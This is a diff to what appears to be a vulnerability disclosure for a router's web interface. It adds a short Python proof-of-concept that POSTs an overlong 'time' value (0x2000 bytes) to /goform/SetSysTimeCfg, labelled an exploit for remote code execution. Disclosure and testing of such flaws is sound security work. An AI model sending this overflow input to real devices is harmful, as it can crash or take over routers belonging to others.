@@ -22,4 +22,17 @@ So by POSTing the page `/goform/SetSysTimeCfg` with proper `time`, the attacker 
 
 # POC
 
-Exploit for **Remote Code Execution**:
+‘’‘
+import requests
+from pwn import *
+
+url = "https://192.168.2.1/goform/SetSysTimeCfg"
+
+timeType = "manual"
+
+time = b"2022-01-01 "
+time += b"a"*0x2000
+r = requests.post(url, data={'timeType': timeType, 'time': time},verify=False)
+print(r.content)
+’‘’
+python
